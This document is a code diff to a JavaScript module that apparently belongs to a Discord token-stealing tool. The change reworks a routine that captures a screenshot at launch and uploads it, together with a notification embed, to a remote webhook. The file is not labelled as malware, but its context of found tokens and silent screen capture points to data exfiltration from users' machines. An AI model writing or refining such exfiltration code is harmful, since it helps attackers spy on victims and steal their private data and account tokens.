@@ -667,9 +667,6 @@ This file indicates that the Discord module found tokens but couldn't process th
                 return false;
             }
 
-            const FormData = require('form-data');
-            const formData = new FormData();
-
             // Check if it's a placeholder text file or actual screenshot
             const isPlaceholder = screenshotPath.includes('placeholder') || screenshotPath.endsWith('.txt');
             const fileType = isPlaceholder ? 'report' : 'screenshot';
@@ -704,17 +701,29 @@ This file indicates that the Discord module found tokens but couldn't process th
                 timestamp: new Date().toISOString()
             };
 
-            const contentMessage = isPlaceholder ? 
-                "📄 **Screenshot Report** (headless environment detected)" :
-                "📸 **Screenshot captured at launch**";
+            // STEP 1: Send the embed first (without the image)
+            logger.info('Sending screenshot capture notification embed');
+            const embedPayload = {
+                content: null,
+                embeds: [embed],
+                attachments: []
+            };
 
-            formData.append('payload_json', JSON.stringify({ 
-                content: contentMessage,
-                embeds: [embed] 
-            }));
+            const embedResponse = await this.sendWebhook(embedPayload);
+            if (!embedResponse) {
+                logger.warn('Failed to send screenshot embed, skipping image upload');
+                return false;
+            }
+
+            // STEP 2: Send the image file separately (without any content text)
+            logger.info('Sending screenshot image file');
+            const FormData = require('form-data');
+            const formData = new FormData();
+
+            // Send only the file without any content message or embed
             formData.append('file', fs.createReadStream(screenshotPath));
 
-            const response = await axios.post(this.webhookUrl, formData, {
+            const fileResponse = await axios.post(this.webhookUrl, formData, {
                 headers: {
                     ...formData.getHeaders()
                 },
@@ -723,7 +732,8 @@ This file indicates that the Discord module found tokens but couldn't process th
 
             logger.info(`Screenshot ${fileType} sent to webhook successfully`, { 
                 file: screenshotPath, 
-                status: response.status,
+                embedStatus: embedResponse ? 'sent' : 'failed',
+                fileStatus: fileResponse.status,
                 type: fileType
             });
             return true;
